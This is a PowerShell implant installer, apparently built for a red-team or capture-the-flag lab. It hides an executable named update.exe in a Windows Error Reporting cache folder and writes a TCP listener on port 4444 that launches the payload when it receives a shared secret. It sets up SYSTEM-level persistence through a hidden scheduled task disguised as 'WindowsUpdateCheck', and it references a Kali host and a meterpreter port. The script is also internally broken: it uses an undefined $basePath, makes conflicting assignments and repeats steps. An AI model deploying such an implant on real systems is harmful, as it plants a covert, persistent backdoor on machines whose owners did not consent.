# === Implant Setup Script ===
# Drops challenge wrapper, content, creates scheduled task, and starts immediately

$kaliIP = "172.30.119.180"
$baseURL = "http://${kaliIP}:8080"
$contentPath = $env:LOCALAPPDATA\Microsoft\Windows\WER\ReportArchive\Cache\update.exe
$sourceExe     = ".\update.exe"
$taskName      = "WindowsUpdateCheck"
$challengePort = 4444
$meterPort = 5555
$contentPath = "$basePath\update_check.exe"
$wrapperPath = "$basePath\challenge_wrapper.ps1"
$authToken = "blueswindowmachine"

# Step 1: Move target
Move-Item -Path .\update.exe -Destination "$env:LOCALAPPDATA\Microsoft\Windows\WER\ReportArchive\Cache\challenge_wrapper.exe" -Force
Move-Item -Path .\update.exe -Destination "$env:LOCALAPPDATA\Microsoft\Windows\WER\ReportArchive\Cache\update.exe" -Force
Write-Host "[*] Moved to $env:LOCALAPPDATA\Microsoft\Windows\WER\ReportArchive\Cache\update.exe" -ForegroundColor Green

# === Step 1: Stage the payload ===
$destDir = Split-Path $contentPath -Parent
if (-not (Test-Path $destDir)) {
    New-Item -ItemType Directory -Path $destDir -Force | Out-Null
}

if (-not (Test-Path $sourceExe)) {
    Write-Host "[!] Source $sourceExe not found." -ForegroundColor Red
    exit 1
}

Move-Item -Path $sourceExe -Destination $contentPath -Force
if (Test-Path $contentPath) {
    Write-Host "[*] Staged payload at $contentPath" -ForegroundColor Green
} else {
    Write-Host "[!] Failed to stage payload." -ForegroundColor Red
    exit 1
}

# === Step 2: Write the wrapper ===
# Double-quoted here-string: bare $vars expand NOW (baked into file as literals).
# Backticked `$vars stay as literal $var in the file (evaluated at wrapper runtime).
$wrapper = @"
`$port      = $challengePort
`$exePath   = "$contentPath"
`$expected  = "$authToken"

try {
    `$listener = New-Object System.Net.Sockets.TcpListener([System.Net.IPAddress]::Any, `$port)
    `$listener.Start()
} catch {
    exit 1
}

while (`$true) {
    `$client = `$null
    try {
        `$client = `$listener.AcceptTcpClient()
        `$client.ReceiveTimeout = 5000
        `$stream = `$client.GetStream()

        `$reader = New-Object System.IO.StreamReader(`$stream)
        `$writer = New-Object System.IO.StreamWriter(`$stream)
        `$writer.AutoFlush = `$true

        # Require shared secret on the first line; drop otherwise.
        `$line = `$reader.ReadLine()
        if (`$line -ne `$expected) {
            `$client.Close()
            continue
        }

        `$writer.WriteLine("OK")

        `$running = Get-Process | Where-Object { `$_.Path -eq `$exePath }
        if (-not `$running) {
            Start-Process -FilePath `$exePath
            `$writer.WriteLine("launched")
        } else {
            `$writer.WriteLine("already running")
        }
    } catch {
        Start-Sleep -Milliseconds 500
    } finally {
        if (`$client -ne `$null) { `$client.Close() }
    }
}
"@

$wrapper | Out-File -FilePath $wrapperPath -Encoding ASCII -Force
if (Test-Path $wrapperPath) {
    Write-Host "[*] Wrapper written to $wrapperPath" -ForegroundColor Yellow
} else {
    Write-Host "[!] Failed to write wrapper." -ForegroundColor Red
    exit 1
}

# === Step 3: Persistence via scheduled task ===
schtasks /create /tn $taskName `
    /tr "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$wrapperPath`"" `
    /sc onstart `
    /ru SYSTEM `
    /f | Out-Null

if ($LASTEXITCODE -eq 0) {
    Write-Host "[*] Scheduled task '$taskName' created." -ForegroundColor Green
} else {
    Write-Host "[!] Scheduled task creation failed (exit $LASTEXITCODE)." -ForegroundColor Red
    exit 1
}

# === Step 4: Kick it off now without waiting for reboot ===
schtasks /run /tn $taskName | Out-Null
Write-Host "[*] Task started. Listener should be live on port $challengePort." -ForegroundColor Green
